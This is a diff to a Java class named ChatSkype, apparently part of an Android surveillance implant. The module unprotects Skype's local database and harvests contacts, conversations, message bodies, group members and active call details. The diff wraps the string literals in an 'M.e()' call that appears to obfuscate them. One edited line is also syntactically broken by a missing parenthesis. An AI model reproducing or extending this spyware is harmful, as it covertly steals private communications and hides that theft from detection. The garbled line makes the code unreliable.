@@ -33,7 +33,7 @@ public class ChatSkype extends SubModuleChat {
 	private static final String TAG = "ChatSkype";
 
 	private static final int PROGRAM = 0x01;
-	String pObserving = "com.skype";
+	String pObserving = M.e("com.skype");
 
 	private Date lastTimestamp;
 
@@ -174,7 +174,7 @@ public class ChatSkype extends SubModuleChat {
 		String dbFile = dbDir + "/" + account + M.e("/main.db");
 		Path.unprotect(dbDir + "/" + account, true);
 		Path.unprotect(dbFile, true);
-		Path.unprotect(dbFile + "-journal", true);
+		Path.unprotect(dbFile + M.e("-journal"), true);
 
 		File file = new File(dbFile);
 
@@ -191,10 +191,10 @@ public class ChatSkype extends SubModuleChat {
 	}
 
 	private void saveSkypeContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { "id", "skypename", "fullname", "displayname", "pstnnumber" };
+		String[] projection = new String[] { M.e("id"), M.e("skypename", M.e("fullname"), M.e("displayname"), M.e("pstnnumber") };
 
 		boolean tosave = false;
-		RecordVisitor visitor = new RecordVisitor(projection, "is_permanent=1") {
+		RecordVisitor visitor = new RecordVisitor(projection, M.e("is_permanent=1")) {
 
 			@Override
 			public long cursor(Cursor cursor) {
@@ -230,8 +230,8 @@ public class ChatSkype extends SubModuleChat {
 
 		final List<SkypeConversation> conversations = new ArrayList<SkypeConversation>();
 
-		String[] projection = new String[] { "id", "identity", "displayname", "given_displayname", "inbox_message_id" };
-		String selection = "inbox_timestamp > 0 and is_permanent=1";
+		String[] projection = new String[] { M.e("id"), M.e("identity"), M.e("displayname"), M.e("given_displayname"), M.e("inbox_message_id") };
+		String selection = M.e("inbox_timestamp > 0 and is_permanent=1");
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -262,10 +262,10 @@ public class ChatSkype extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { "id", "author", "body_xml", "timestamp" };
-			String selection = "type == 61 and convo_id = " + conversation.id + " and body_xml != '' and id > "
+			String[] projection = new String[] { M.e("id"), M.e("author"), M.e("body_xml"), M.e("timestamp") };
+			String selection = M.e("type == 61 and convo_id = ") + conversation.id + M.e(" and body_xml != '' and id > ")
 					+ lastConvId;
-			String order = "timestamp";
+			String order = M.e("timestamp");
 
 			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
 
@@ -337,8 +337,8 @@ public class ChatSkype extends SubModuleChat {
 
 	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {
 
-		String[] projection = new String[] { "identity" };
-		String selection = "chatname = '" + conversation + "'";
+		String[] projection = new String[] { M.e("identity") };
+		String selection = M.e("chatname = '") + conversation + "'";
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 			@Override
@@ -349,7 +349,7 @@ public class ChatSkype extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRecords("ChatMembers", visitor);
+		helper.traverseRecords(M.e("ChatMembers"), visitor);
 	}
 
 	public static String readAccount() {
@@ -363,11 +363,11 @@ public class ChatSkype extends SubModuleChat {
 		try {
 			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
 			Document doc = builder.parse(new File(confFile));
-			NodeList defaults = doc.getElementsByTagName("Default");
+			NodeList defaults = doc.getElementsByTagName(M.e("Default"));
 			for (int i = 0; i < defaults.getLength(); i++) {
 				Node d = defaults.item(i);
 				Node p = d.getParentNode();
-				if ("Account".equals(p.getNodeName())) {
+				if (M.e("Account").equals(p.getNodeName())) {
 					account = d.getFirstChild().getNodeValue();
 					break;
 				}
@@ -407,7 +407,7 @@ public class ChatSkype extends SubModuleChat {
 
 	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
 		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
-		String sqlQuery= "select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by ca.id desc limit 1";
+		String sqlQuery= M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by ca.id desc limit 1");
 		
 		RecordVisitor visitor = new RecordVisitor() {
 
